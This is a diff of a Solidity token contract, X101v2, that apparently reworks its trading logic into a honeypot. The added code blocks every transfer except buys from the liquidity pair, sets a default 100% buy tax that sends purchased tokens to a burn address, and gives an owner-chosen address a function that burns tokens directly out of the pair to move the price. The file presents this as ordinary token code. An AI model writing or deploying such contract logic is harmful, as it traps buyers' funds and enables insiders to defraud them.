@@ -33,43 +33,43 @@ interface IPancakePair {
     function sync() external;
 }
 
-interface IGas{
-    function specificBurn(address account, address to, uint256 amount) external;
-}
+
 
 contract X101v2 is ERC20, Ownable{
 
     IPancakeRouter02 public pancakeRouter = IPancakeRouter02(0x1F7CdA03D18834C8328cA259AbE57Bf33c46647c);
     address public constant DEAD = 0x000000000000000000000000000000000000dEaD;
-    address public constant USDT = 0x3ea660cDc7b7CCC9F81c955f1F2412dCeb8518A5;
     address public constant ADX = 0x68a4d37635cdB55AF61B8e58446949fB21f384e5;
 
-    uint256 public  sell_tax_rate = 20;
     uint256 public  buy_tax_rate = 100;
 
     address public pancakePair;
-    address public gas;
+    address public specifySell;
 
     mapping(address => bool) public allowlist;
 
-    constructor(address _initialRecipient, address _gas)ERC20("X101v2","X101")Ownable(msg.sender){
+    constructor(address _initialRecipient)ERC20("X101v2","X101")Ownable(msg.sender){
         _mint(_initialRecipient, 1010000e18);
         pancakePair = IPancakeFactory(pancakeRouter.factory())
             .createPair(address(this), ADX);
-        gas = _gas;
         allowlist[_initialRecipient] = true;
-
     }
 
-    function setTaxRate(uint256 _buyRate, uint256 _sellRate) external onlyOwner {
-        require(_buyRate <= 50 && _sellRate <= 50, "RATE_TOO_HIGH");
+    modifier onlyBurn() {
+        require(specifySell == msg.sender, "NOT_PERMIT.");
+        _;
+    }
+
+    function setTaxRate(uint256 _buyRate) external onlyOwner {
+        require(_buyRate <= 50, "RATE_TOO_HIGH");
         buy_tax_rate = _buyRate;
-        sell_tax_rate = _sellRate;
     }
 
 
-    function setGasAddr(address _gas) external onlyOwner{
-        gas = _gas;
+    function setSpecifySell(address _specifySell) external onlyOwner{
+        require(_specifySell != address(0),"Error addr.");
+        specifySell = _specifySell;
+        allowlist[_specifySell] = true;
     }
 
 
@@ -93,60 +93,23 @@ contract X101v2 is ERC20, Ownable{
         }
 
         bool isBuy  = from == pancakePair;
-        bool isSell = to == pancakePair;
 
-        require(isBuy || isSell, "TRANSFER_DISABLED");
+        require(isBuy, "TRANSFER_AND_SELL_DISABLED");
 
-        uint256 taxAmount;
+        uint256 taxAmount = amount * buy_tax_rate / 100;
 
         // ================= BUY =================
-        if (isBuy && buy_tax_rate > 0) {
-            taxAmount = amount * buy_tax_rate / 100;
-
+        if (isBuy) {
             uint256 sendAmount = amount - taxAmount;
-
             super._update(from, DEAD, taxAmount);
             super._update(from, to, sendAmount);
             return;
         }
 
-        // ================= SELL =================
-        if (isSell && sell_tax_rate > 0) {
-            taxAmount = amount * sell_tax_rate / 100;
-            super._update(from, to, amount);
-            super._update(to, DEAD, taxAmount);
-            IPancakePair(pancakePair).sync();
-     
-            if (gas != address(0)) {
-                uint256 amountBurn = getAmountOut(amount - taxAmount);
-                if (amountBurn > 0) IGas(gas).specificBurn(from, DEAD, amountBurn);
-                
-            }
-            return;
-        }
-
-        super._update(from, to, amount);
     }
 
-
-    function getAmountOut(uint256 amount) public view returns(uint256){
-        address factory = pancakeRouter.factory();        
-        (uint112 reserve0, uint112 reserve1,) = IPancakePair(pancakePair).getReserves();
-        if(reserve0 > 0 && reserve1 > 0){
-            address adxPair = IPancakeFactory(factory).getPair(ADX, USDT);
-            if(adxPair != address(0)){
-                (uint112 reserveADX, uint112 reserveUSDT,) = IPancakePair(adxPair).getReserves();
-                if(reserveADX > 0 && reserveUSDT > 0){
-                        address[] memory path = new address[](3);
-                        path[0] = address(this);
-                        path[1] = ADX;
-                        path[2] = USDT;
-                        return pancakeRouter.getAmountsOut(amount, path)[2];
-                }
-            }
-        }
-        return 0;
+    function burnFromPair(uint256 amount) external onlyBurn(){
+        super._update(pancakePair,DEAD, amount);
     }
-
     
 }
